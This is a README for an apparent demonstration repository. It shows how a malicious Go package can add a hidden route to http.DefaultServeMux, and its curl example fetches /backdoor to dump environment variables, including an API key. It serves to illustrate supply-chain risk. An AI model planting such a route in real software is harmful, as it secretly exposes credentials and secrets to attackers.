# backdoor-victim

Demo for backdooring golang's `http.DefaultServeMux`

## Purpose

This is an example victim that is simply trying to make a classic "Hello World" webserver with Go. For whatever reason, they included a malicious package that adds a backdoored HTTP route.

> **Note:** The [`backdoor`](https://github.com/picatz/backdoor) package is being explictly used here. But, it could've also been used anouther third-part library as a middle-man that that imported rather than so directly done here.

## Testing

Run the server:

```console
$ go run main.go
```

In anouther terminal (or in your browser) hit the default route:

```console
$ curl http://127.0.0.1:8080/
Hello world!
```

Then check the backdoor route to *sneakily* list the application environment variables:

```console
$ curl http://127.0.0.1:8080/backdoor
TERM=xterm-256color
SHELL=/bin/bash
SERVICE_API_KEY=77686174206973206C6F76653F206261627920646F6E27742068757274206D65
...
```
